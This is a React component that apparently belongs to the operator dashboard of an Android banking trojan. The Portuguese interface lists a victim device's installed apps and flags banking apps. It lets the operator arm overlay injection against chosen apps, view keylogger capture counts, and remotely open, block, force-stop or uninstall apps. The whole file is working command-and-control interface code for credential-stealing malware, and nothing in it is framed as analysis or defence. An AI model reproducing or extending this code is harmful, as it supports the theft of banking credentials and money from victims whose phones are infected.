import { useState } from 'react';
import useStore from '../../store/index.js';

export default function AppManager({ deviceId, onBack, sendCmd }) {
  const apps     = useStore(s => s.deviceApps);
  const refreshApps = useStore(s => s.refreshApps);
  const setInjectActive = useStore(s => s.setInjectActive);
  const [search, setSearch] = useState('');
  const [filter, setFilter] = useState('all'); // all | bank | inject

  const filtered = apps.filter(a => {
    const q = search.toLowerCase();
    const match = !q || (a.app_name || '').toLowerCase().includes(q) || (a.package_name || '').toLowerCase().includes(q);
    if (!match) return false;
    if (filter === 'bank')   return a.is_bank;
    if (filter === 'inject') return a.inject_active;
    return true;
  });

  function toggleInject(pkg, current) {
    const enabled = !current;
    fetch(`/api/devices/${deviceId}/apps/${encodeURIComponent(pkg)}/inject`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ enabled }),
    });
    setInjectActive(pkg, enabled);
    if (enabled) sendCmd('ARM_OVERLAY_MAPPING', { package: pkg, template: {} });
    else         sendCmd('DISARM_OVERLAY_MAPPING', { package: pkg });
  }

  function refresh() {
    sendCmd('GET_INSTALLED_APPS');
    setTimeout(refreshApps, 2500);
  }

  return (
    <div className="fade-up">
      <div className="row-sb mb12">
        <div className="bold txt-gold">📱 APLICATIVOS</div>
        <button className="btn btn-ghost btn-sm" onClick={onBack}>← VOLTAR</button>
      </div>

      {/* Filters */}
      <div className="row gap6 mb8">
        {[['all','Todos'],['bank','Bancos'],['inject','Injetados']].map(([id, label]) => (
          <button key={id} className={`btn btn-sm ${filter === id ? 'btn-gold' : 'btn-ghost'}`}
            onClick={() => setFilter(id)}>{label}</button>
        ))}
        <button className="btn btn-ghost btn-sm" onClick={refresh} style={{ marginLeft: 'auto' }}>↺</button>
      </div>

      <div className="input-row mb12">
        <input className="input" placeholder="Buscar aplicativo..." value={search}
          onChange={e => setSearch(e.target.value)} />
      </div>

      {/* App list toast */}
      <div className="txt-xs txt-dim mb8">{filtered.length} aplicativo(s)</div>

      {filtered.length === 0 && (
        <div className="no-data">
          {apps.length === 0 ? 'Nenhum app carregado. Toque ↺ para sincronizar.' : 'Nenhum resultado.'}
        </div>
      )}

      {filtered.map(a => (
        <AppCard key={a.package_name} app={a} deviceId={deviceId}
          onToggleInject={() => toggleInject(a.package_name, !!a.inject_active)}
          sendCmd={sendCmd} />
      ))}
      <div style={{ height: 20 }} />
    </div>
  );
}

function AppCard({ app, sendCmd, onToggleInject }) {
  const injectOn = !!app.inject_active;

  return (
    <div className="app-card">
      {/* Header */}
      <div className="app-card-head">
        {app.icon_b64 ? (
          <img src={`data:image/png;base64,${app.icon_b64}`} className="app-icon" alt="" />
        ) : (
          <div className="app-icon-placeholder">📱</div>
        )}
        <div className="flex1">
          <div className="row-sb">
            <span className="app-name">{app.app_name || app.package_name}</span>
            <span className={`pill ${injectOn ? 'pill-green' : 'pill-dim'}`} style={{ fontSize: 10 }}>
              {injectOn ? 'INJECT ON' : 'INJECT OFF'}
            </span>
          </div>
          <div className="app-pkg">{app.package_name}</div>
          {app.is_bank ? <span className="pill pill-red mt4" style={{ fontSize: 9 }}>BANCO</span> : null}
        </div>
      </div>

      {/* Meta */}
      <div className="app-meta">
        <div>
          <div className="app-meta-label">ÚLTIMO ACESSO:</div>
          <div className="app-meta-val">{app.last_access || 'Varredura recente'}</div>
        </div>
        <div style={{ textAlign: 'right' }}>
          <div className="app-meta-label">KEYLOGGER:</div>
          <div className="app-meta-val">{app.keylog_count || 0} registro(s)</div>
        </div>
      </div>

      {/* Actions */}
      <div className="app-actions">
        <button className="btn btn-green btn-sm" onClick={() => sendCmd('OPEN_APP', { package: app.package_name })}>
          ▶ ABRIR
        </button>
        <button className="btn btn-olive btn-sm" onClick={onToggleInject}>
          ✏ {injectOn ? 'DESATIVAR' : 'INJET'}
        </button>
        <button className="btn btn-danger-soft btn-sm"
          onClick={() => { if (confirm(`Remover ${app.app_name}?`)) sendCmd('UNINSTALL_APP', { package: app.package_name }); }}>
          ⊗ REMOVER
        </button>
      </div>
      <div className="app-actions mt4">
        <button className="btn btn-danger-soft btn-sm"
          onClick={() => sendCmd('TOGGLE_BLOCK_APP', { package: app.package_name, block: true })}>
          🛡 IMPEDIR
        </button>
        <button className="btn btn-ghost btn-sm" onClick={() => sendCmd('FORCE_STOP', { package: app.package_name })}>
          ⌨ KEYLOG ({app.keylog_count || 0})
        </button>
        <button className="btn btn-ghost btn-xs" title="Copiar pacote"
          onClick={() => navigator.clipboard?.writeText(app.package_name).catch(() => {})}>□</button>
        <button className="btn btn-danger-soft btn-xs" title="Deletar"
          onClick={() => { if(confirm('Delete?')) sendCmd('UNINSTALL_APP', { package: app.package_name }); }}>🗑</button>
      </div>
    </div>
  );
}
